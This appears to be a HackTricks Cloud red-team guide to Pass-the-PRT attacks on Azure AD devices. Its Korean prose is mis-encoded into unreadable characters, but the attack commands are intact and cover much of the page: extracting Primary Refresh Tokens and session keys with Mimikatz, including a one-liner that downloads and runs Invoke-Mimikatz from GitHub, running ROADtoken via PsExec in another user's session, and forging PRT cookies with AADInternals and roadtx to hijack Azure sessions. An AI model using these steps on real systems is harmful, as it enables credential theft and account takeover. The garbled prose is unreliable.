# Az - PRT ì „ë‹¬

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

## PRTì´ë€ ë¬´ì—‡ì¸ê°€

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### PRTê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ê¸°
```
Dsregcmd.exe /status
```
SSO ìƒíƒœ ì„¹ì…˜ì—ì„œ **`AzureAdPrt`**ê°€ **YES**ë¡œ ì„¤ì •ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

ë™ì¼í•œ ì¶œë ¥ì—ì„œ **Azureì— ê°€ì…ëœ ì¥ì¹˜**ì¸ì§€ í™•ì¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (`AzureAdJoined` í•„ë“œ):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## PRT ì¿ í‚¤

PRT ì¿ í‚¤ëŠ” ì‹¤ì œë¡œ **`x-ms-RefreshTokenCredential`**ë¼ê³  ë¶ˆë¦¬ë©°, JSON Web Token (JWT)ì…ë‹ˆë‹¤. JWTëŠ” `.`ë¡œ êµ¬ë¶„ë˜ëŠ” **í—¤ë”**, **í˜ì´ë¡œë“œ**, **ì„œëª…**ìœ¼ë¡œ êµ¬ì„±ëœ 3ê°œì˜ ë¶€ë¶„ìœ¼ë¡œ ì´ë£¨ì–´ì ¸ ìˆìœ¼ë©°, ëª¨ë‘ URL ì•ˆì „í•œ base64ë¡œ ì¸ì½”ë”©ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ì¸ PRT ì¿ í‚¤ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í—¤ë”ì™€ ë³¸ë¬¸ì„ í¬í•¨í•©ë‹ˆë‹¤:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
ì‹¤ì œ **Primary Refresh Token (PRT)**ì€ **`refresh_token`** ë‚´ì— ìº¡ìŠí™”ë˜ì–´ ìˆìœ¼ë©°, Azure ADì˜ í‚¤ë¡œ ì•”í˜¸í™”ë˜ì–´ ë‚´ìš©ì„ ìš°ë¦¬ê°€ í•´ë…í•  ìˆ˜ ì—†ê²Œ ë§Œë“­ë‹ˆë‹¤. **`is_primary`** í•„ë“œëŠ” ì´ í† í° ë‚´ì—ì„œ ì£¼ìš” ìƒˆë¡œ ê³ ì¹¨ í† í°ì˜ ìº¡ìŠí™”ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì¿ í‚¤ê°€ íŠ¹ì • ë¡œê·¸ì¸ ì„¸ì…˜ì— ë°”ì¸ë”©ë˜ì–´ ìœ ì§€ë˜ë„ë¡ í•˜ê¸° ìœ„í•´ `request_nonce`ì´ `logon.microsoftonline.com` í˜ì´ì§€ì—ì„œ ì „ì†¡ë©ë‹ˆë‹¤.

### TPMì„ ì‚¬ìš©í•œ PRT ì¿ í‚¤ íë¦„

**LSASS** í”„ë¡œì„¸ìŠ¤ëŠ” **KDF ì»¨í…ìŠ¤íŠ¸**ë¥¼ TPMì— ë³´ë‚´ê³ , TPMì€ **ì„¸ì…˜ í‚¤** (AzureADì— ë“±ë¡ëœ ì¥ì¹˜ì—ì„œ ìˆ˜ì§‘ë˜ê³  TPMì— ì €ì¥ëœ)ì™€ ì´ì „ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ **í‚¤ë¥¼ íŒŒìƒ**í•˜ê³ , ì´ **íŒŒìƒëœ í‚¤**ë¥¼ ì‚¬ìš©í•˜ì—¬ PRT ì¿ í‚¤ (JWT)ë¥¼ **ì„œëª…**í•©ë‹ˆë‹¤.

**KDF ì»¨í…ìŠ¤íŠ¸**ëŠ” AzureADì˜ nonceì™€ PRTì´ë©°, ì´ë¥¼ **ì»¨í…ìŠ¤íŠ¸** (ì„ì˜ì˜ ë°”ì´íŠ¸)ì™€ í˜¼í•©í•˜ì—¬ **JWT**ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ, PTRì´ TPM ë‚´ë¶€ì— ìœ„ì¹˜í•˜ì—¬ ì¶”ì¶œí•  ìˆ˜ ì—†ë”ë¼ë„, LSASSë¥¼ ì•…ìš©í•˜ì—¬ ìƒˆë¡œìš´ ì»¨í…ìŠ¤íŠ¸ì—ì„œ íŒŒìƒëœ í‚¤ë¥¼ ìš”ì²­í•˜ê³  ìƒì„±ëœ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¿ í‚¤ì— ì„œëª…í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## PRT ë‚¨ìš© ì‹œë‚˜ë¦¬ì˜¤

**ì¼ë°˜ ì‚¬ìš©ì**ë¡œì„œ SSO ë°ì´í„°ë¥¼ ìš”ì²­í•˜ì—¬ PRT ì‚¬ìš©ì„ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” **ë„¤ì´í‹°ë¸Œ ì•±**ì´ **Web Account Manager** (í† í° ë¸Œë¡œì»¤)ì—ì„œ í† í°ì„ ìš”ì²­í•˜ëŠ” ë°©ì‹ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. WAMì€ ìš”ì²­ì„ **LSASS**ì— ì „ë‹¬í•˜ê³ , LSASSëŠ” ì„œëª…ëœ PRT ì–´ì„¤ì…˜ì„ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìš”ì²­í•©ë‹ˆë‹¤. ë˜ëŠ” **ë¸Œë¼ìš°ì € ê¸°ë°˜ (ì›¹) í”Œë¡œìš°**ì—ì„œëŠ” **PRT ì¿ í‚¤**ë¥¼ **í—¤ë”**ë¡œ ì‚¬ìš©í•˜ì—¬ Azure AS ë¡œê·¸ì¸ í˜ì´ì§€ì— ëŒ€í•œ ìš”ì²­ì„ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**SYSTEM**ìœ¼ë¡œì„œ TPMì— ì˜í•´ ë³´í˜¸ë˜ì§€ ì•Šì€ ê²½ìš° PRTë¥¼ **ë„ìš©**í•˜ê±°ë‚˜ ì•”í˜¸ APIë¥¼ ì‚¬ìš©í•˜ì—¬ LSASSì—ì„œ **PRT í‚¤ì™€ ìƒí˜¸ ì‘ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Pass-the-PRT ê³µê²© ì˜ˆì‹œ

### ê³µê²© - ROADtoken

ì´ ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ì´ ê²Œì‹œë¬¼**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤. ROADtokenì€ ì˜¬ë°”ë¥¸ ë””ë ‰í† ë¦¬ì—ì„œ **`BrowserCore.exe`**ë¥¼ ì‹¤í–‰í•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ PRT ì¿ í‚¤ë¥¼ **ì–»ìŠµë‹ˆë‹¤**. ì´ ì¿ í‚¤ëŠ” ROADtoolsë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦í•˜ê³  **ì§€ì†ì ì¸ ìƒˆë¡œ ê³ ì¹¨ í† í°**ì„ ì–»ê¸° ìœ„í•´ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìœ íš¨í•œ PRT ì¿ í‚¤ë¥¼ ìƒì„±í•˜ë ¤ë©´ ë¨¼ì € nonceê°€ í•„ìš”í•©ë‹ˆë‹¤.\
ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ nonceë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
ë˜ëŠ” [**roadrecon**](https://github.com/dirkjanm/ROADtools)ì„ ì‚¬ìš©í•˜ì—¬:
```powershell
roadrecon auth prt-init
```
ê·¸ëŸ° ë‹¤ìŒ [**roadtoken**](https://github.com/dirkjanm/ROADtoken)ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ PRTë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ê³µê²©ì„ ìœ„í•´ ì‚¬ìš©ìì˜ í”„ë¡œì„¸ìŠ¤ì—ì„œ ë„êµ¬ë¥¼ ì‹¤í–‰).
```powershell
.\ROADtoken.exe <nonce>
```
ë‹¤ìŒì€ PRT(Pass-the-PRT) ê³µê²©ì— ëŒ€í•œ ë‚´ìš©ì…ë‹ˆë‹¤. PRTëŠ” Azure AD(Active Directory)ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì¸ì¦ í‹°ì¼“ì…ë‹ˆë‹¤. ì´ ê³µê²©ì€ í´ë¼ìš°ë“œ í™˜ê²½ê³¼ ì˜¨í”„ë ˆë¯¸ìŠ¤ í™˜ê²½ ê°„ì˜ ì—°ê²°ì„ í†µí•´ ìˆ˜í–‰ë©ë‹ˆë‹¤. ê³µê²©ìëŠ” í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ íšë“í•œ PRTë¥¼ ì‚¬ìš©í•˜ì—¬ ì˜¨í”„ë ˆë¯¸ìŠ¤ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ì–»ì€ ê¶Œí•œì„ í™œìš©í•˜ì—¬ ì˜¨í”„ë ˆë¯¸ìŠ¤ í™˜ê²½ì„ íƒìƒ‰í•˜ê³  ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ Azure AD Connectì™€ ê°™ì€ ë„êµ¬ë¥¼ í†µí•´ í´ë¼ìš°ë“œì™€ ì˜¨í”„ë ˆë¯¸ìŠ¤ ê°„ì˜ ì‹±í¬ë¥¼ ì„¤ì •í•œ ê²½ìš°ì— íŠ¹íˆ ì·¨ì•½í•©ë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ í™˜ê²½ì—ì„œì˜ ë³´ì•ˆ ê°•í™”ì™€ í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œì˜ ê¶Œí•œ ê´€ë¦¬ê°€ í•„ìš”í•©ë‹ˆë‹¤.
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

ê·¸ëŸ° ë‹¤ìŒ ìƒì„±ëœ ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ Azure AD Graph ë˜ëŠ” Microsoft Graphë¥¼ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ì¸í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### ê³µê²© - roadrecon ì‚¬ìš©

### ê³µê²© - AADInternals ë° ìœ ì¶œëœ PTR ì‚¬ìš©

`Get-AADIntUserPRTToken`ì€ Azure ADì— ê°€ì…í•œ ë˜ëŠ” í•˜ì´ë¸Œë¦¬ë“œ ê°€ì…í•œ ì»´í“¨í„°ì—ì„œ ì‚¬ìš©ìì˜ PRT í† í°ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. PRT í† í°ì„ ê°€ì ¸ì˜¤ê¸° ìœ„í•´ `BrowserCore.exe`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
ë˜ëŠ” Mimikatzì—ì„œ ì–»ì€ ê°’ì´ ìˆë‹¤ë©´ AADInternalsë¥¼ ì‚¬ìš©í•˜ì—¬ í† í°ì„ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
[https://login.microsoftonline.com](https://login.microsoftonline.com)ë¡œ ì´ë™í•˜ê³ , login.microsoftonline.comì˜ ëª¨ë“  ì¿ í‚¤ë¥¼ ì§€ìš°ê³  ìƒˆë¡œìš´ ì¿ í‚¤ë¥¼ ì…ë ¥í•˜ì„¸ìš”.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ê·¸ëŸ° ë‹¤ìŒ [https://portal.azure.com](https://portal.azure.com)ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤.

{% hint style="danger" %}
ë‚˜ë¨¸ì§€ëŠ” ê¸°ë³¸ê°’ìœ¼ë¡œ ì„¤ì •ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹¨í•˜ê³  ì¿ í‚¤ê°€ ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ì‚¬ë¼ì§„ë‹¤ë©´ ì‹¤ìˆ˜ë¥¼ í•œ ê²ƒì´ë¯€ë¡œ ë‹¤ì‹œ í”„ë¡œì„¸ìŠ¤ë¥¼ ì§„í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ë‹¤ë©´ ë¬¸ì œê°€ ì—†ìŠµë‹ˆë‹¤.
{% endhint %}

### ê³µê²© - Mimikatz

#### ë‹¨ê³„

1. **PRT (Primary Refresh Token)ëŠ” LSASS (Local Security Authority Subsystem Service)ì—ì„œ ì¶”ì¶œ**ë˜ì–´ ì´í›„ ì‚¬ìš©ì„ ìœ„í•´ ì €ì¥ë©ë‹ˆë‹¤.
2. ë‹¤ìŒìœ¼ë¡œ **ì„¸ì…˜ í‚¤ë¥¼ ì¶”ì¶œ**í•©ë‹ˆë‹¤. ì´ í‚¤ëŠ” ì´ˆê¸°ì— ë°œê¸‰ë˜ê³  ë¡œì»¬ ì¥ì¹˜ì—ì„œ ë‹¤ì‹œ ì•”í˜¸í™”ë˜ê¸° ë•Œë¬¸ì— DPAPI ë§ˆìŠ¤í„° í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”í•´ì•¼ í•©ë‹ˆë‹¤. DPAPI (Data Protection API)ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒ ë¦¬ì†ŒìŠ¤ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) ë° í•´ë‹¹ ì‘ìš© í”„ë¡œê·¸ë¨ì— ëŒ€í•œ ì´í•´ë¥¼ ìœ„í•´ [Pass-the-cookie attack](az-pass-the-cookie.md)ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.
3. ì„¸ì…˜ í‚¤ë¥¼ ë³µí˜¸í™”í•œ í›„ **PRTì˜ íŒŒìƒ í‚¤ì™€ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì–»ìŠµë‹ˆë‹¤**. ì´ë“¤ì€ **PRT ì¿ í‚¤ì˜ ìƒì„±**ì— ì¤‘ìš”í•©ë‹ˆë‹¤. íŠ¹íˆ, íŒŒìƒ í‚¤ëŠ” ì¿ í‚¤ë¥¼ êµ¬ì„±í•˜ëŠ” JWT (JSON Web Token)ì— ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•œ ìì„¸í•œ ì„¤ëª…ì€ Dirk-janì´ [ì—¬ê¸°](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)ì—ì„œ ì œê³µí•˜ê³  ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
PRTê°€ TPM ë‚´ë¶€ì— ìˆê³  `lsass` ë‚´ë¶€ì— ì—†ëŠ” ê²½ìš° **mimikatzëŠ” ì¶”ì¶œí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.\
ê·¸ëŸ¬ë‚˜ TPMì—ì„œ íŒŒìƒ í‚¤ë¥¼ ì–»ê³  ì¿ í‚¤ì— ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜µì…˜ 3 í™•ì¸).
{% endhint %}

ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ìˆ˜í–‰ëœ í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•œ **ìì„¸í•œ ì„¤ëª…**ì€ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
2021ë…„ 8ì›” ì´í›„ì˜ ìˆ˜ì • ì‚¬í•­ìœ¼ë¡œ ì¸í•´ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ PRT í† í°ì„ ê°€ì ¸ì˜¬ ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë¡œì»¬ ê´€ë¦¬ìëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìì˜ PRTì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ì§€ë§Œ ìì‹ ì˜ PRTì—ëŠ” ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

**mimikatz**ë¥¼ ì‚¬ìš©í•˜ì—¬ PRTë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(https://blog.netwrix.com/2023/05/13/pass-the-prt-overviewì—ì„œ ì´ë¯¸ì§€ ê°€ì ¸ì˜´)

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

**Prt**ë¡œ í‘œì‹œëœ ë¶€ë¶„ì„ **ë³µì‚¬**í•˜ê³  ì €ì¥í•˜ì„¸ìš”.\
ë˜í•œ ì•„ë˜ì— ê°•ì¡°ëœ **`ProofOfPossesionKey`** í•„ë“œì˜ **`KeyValue`**ì¸ ì„¸ì…˜ í‚¤ë„ ì¶”ì¶œí•˜ì„¸ìš”. ì´ëŠ” ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©°, ìš°ë¦¬ëŠ” DPAPI ë§ˆìŠ¤í„° í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”í•´ì•¼ í•©ë‹ˆë‹¤.

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PRT ë°ì´í„°ë¥¼ ë³¼ ìˆ˜ ì—†ëŠ” ê²½ìš°, ë””ë°”ì´ìŠ¤ê°€ Azure ADì— ê°€ì…ë˜ì–´ ìˆì§€ ì•Šê±°ë‚˜ Windows 10ì˜ **ì˜¤ë˜ëœ ë²„ì „**ì„ ì‹¤í–‰ ì¤‘ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì„¸ì…˜ í‚¤ë¥¼ **ë³µí˜¸í™”**í•˜ë ¤ë©´ **ê¶Œí•œì„ SYSTEMìœ¼ë¡œ ìƒìŠ¹**ì‹œì¼œ ì»´í“¨í„° ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰í•˜ì—¬ **DPAPI ë§ˆìŠ¤í„° í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”**í•´ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

#### ì˜µì…˜ 1 - ì „ì²´ Mimikatz

* ì´ì œ Context ê°’ê³¼ íŒŒìƒëœ í‚¤ ê°’ ë‘˜ ë‹¤ ë³µì‚¬í•˜ê³  ì‹¶ìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* ê·¸ë¦¬ê³  íŒŒìƒëœ í‚¤ ê°’:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* ë§ˆì§€ë§‰ìœ¼ë¡œ ì´ ëª¨ë“  ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ **PRT ì¿ í‚¤ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* [https://login.microsoftonline.com](https://login.microsoftonline.com)ë¡œ ì´ë™í•˜ì—¬, login.microsoftonline.comì˜ ëª¨ë“  ì¿ í‚¤ë¥¼ ì§€ìš°ê³  ìƒˆë¡œìš´ ì¿ í‚¤ë¥¼ ì…ë ¥í•˜ì„¸ìš”.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* ê·¸ëŸ° ë‹¤ìŒ [https://portal.azure.com](https://portal.azure.com)ë¡œ ì´ë™í•˜ì‹­ì‹œì˜¤.

{% hint style="danger" %}
ë‚˜ë¨¸ì§€ëŠ” ê¸°ë³¸ê°’ìœ¼ë¡œ ì„¤ì •ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹  ìˆ˜ ìˆê³  ì¿ í‚¤ê°€ ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ë§Œì•½ ì‚¬ë¼ì§„ë‹¤ë©´, ì‹¤ìˆ˜ë¥¼ í•œ ê²ƒì´ë¯€ë¡œ ë‹¤ì‹œ í”„ë¡œì„¸ìŠ¤ë¥¼ ì§„í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì‚¬ë¼ì§€ì§€ ì•ŠëŠ”ë‹¤ë©´, ë¬¸ì œ ì—†ì„ ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

#### ì˜µì…˜ 2 - PTRì„ ì‚¬ìš©í•œ roadrecon

* ë¨¼ì € PRTë¥¼ ê°±ì‹ í•˜ê³  `roadtx.prt`ì— ì €ì¥í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* ì´ì œ `roadtx browserprtauth`ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”í˜• ë¸Œë¼ìš°ì €ì—ì„œ **í† í°ì„ ìš”ì²­**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `roadtx describe` ëª…ë ¹ì„ ì‚¬ìš©í•˜ë©´ ì•¡ì„¸ìŠ¤ í† í°ì— MFA í´ë ˆì„ì´ í¬í•¨ë˜ì–´ ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš° ì‚¬ìš©í•œ PRTì—ë„ MFA í´ë ˆì„ì´ ìˆì—ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### ì˜µì…˜ 3 - íŒŒìƒ í‚¤ë¥¼ ì‚¬ìš©í•œ roadrecon

mimikatzì— ì˜í•´ ë¤í”„ëœ ì»¨í…ìŠ¤íŠ¸ì™€ íŒŒìƒ í‚¤ë¥¼ ê°€ì§€ê³ , roadreconì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ ì„œëª…ëœ ì¿ í‚¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## ì°¸ê³  ìë£Œ

